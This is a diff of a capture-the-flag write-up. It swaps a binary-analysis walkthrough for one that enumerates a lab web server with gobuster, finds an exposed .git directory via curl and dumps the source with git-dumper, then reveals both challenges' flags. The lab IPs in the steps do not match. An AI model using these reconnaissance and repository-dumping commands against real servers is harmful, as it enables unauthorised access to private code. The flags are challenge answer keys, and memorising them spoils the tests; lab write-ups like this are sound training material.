@@ -39,29 +39,50 @@ The Byte Lotus guest-experience platform went live in a hurry, and the night-shi
     ![file_analisys](./screenshots/http.png)
 
 
-### Step 2 — Strings analisys of the file
+### Step 2 — Enumerating the directory to find exposed endpoints.
 
-- After analize the type of the file we proceeds to check all string in the file.
+- Applying the following command to inspect the website.
 
-- Command: `strings Compiled-1688545393558.Compiled` part of the result I'll show bellow.
+- Command: `gobuster dir -u http://10.146.174.187:8080/ -w /root/Desktop/Tools/wordlists/SecLists/Discovery/Web-Content/common.txt` part of the result I'll show bellow.
 
-![strings_result](./screenshots/strings_command.png)
+    ![strings_result](./screenshots/gobuster_result.png)
 
 
-### Step 3 — Ghidra analisys of the file 
+### Step 3 — Analysing the endpoint founded. 
 
-- Proceding to open the file with GHidra and goind directly to the _main function to inspect the code.
+- After checking the endpoint exposed means that the whole .git object database is likely reached too.
+    This is our entry point.
 
-- Result: 
+- Verifying it's a readable directory with the following curl command:
 
-![ghidra](./screenshots/ghidra_analisys.png)
+    `curl http://10.144.176.255:8080/.git/HEAD` 
 
-- After analyzing the binary the logic revealed that the program prompts Password and read the input using `scanf(“DoYouEven%sCTF”, local_28)`meaning the input must be prefixed with DoYouEven and suffixed with CTF. Since scanf expects DoYouEven%sCTF, the raw input must be DoYouEven_init to form DoYouEven_init
+- After applying the command we get the following result: 
 
-## Flag
+    `ref: refs/heads/main` Meaning that the objects, refs, and logs are almost certainly fetchable too.
 
-`DoYouEven_init`
+![repo](./screenshots/gitrepo.png)
 
+
+### Step 4 — Dumping the full repo with `git-dumper`.
+
+- Installing the python script:  `pip install git-dumper --break-system-packages`
+
+- Applying the command to dumpt the repo: 
+
+    `git-dumper http://10.144.176.255:8080/.git ./byte-lotus-src`
+
+    ![dump](./screenshots/git_dump_command.png)
+
+- After dumping the repo we found the app 
+
+    ![app](./screenshots/app_downloaded.png)
+
+- Inspecting the Readme file: 
+
+    ![readme_file](./screenshots/flag.png)
+
+### Flag `THM{byt3_l0tus_n3v3r_f0rg3ts}`
 
 
     
